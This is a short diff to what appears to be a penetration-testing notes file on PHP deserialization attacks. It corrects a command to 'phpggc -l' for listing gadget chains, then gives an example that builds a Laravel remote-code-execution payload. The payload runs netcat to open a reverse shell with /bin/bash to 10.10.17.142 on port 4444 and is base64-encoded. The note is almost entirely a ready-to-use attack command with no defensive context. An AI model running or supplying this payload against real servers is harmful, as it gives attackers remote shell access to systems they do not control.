@@ -1,5 +1,5 @@
 PHP
-php -l <theframework>
+phpggc -l <theframework>
 then use the framework suitable , you might need to test more than one 
 for example
 phpggc Laravel/RCE9 system 'nc -nv 10.10.17.142 4444 -e /bin/bash' -b
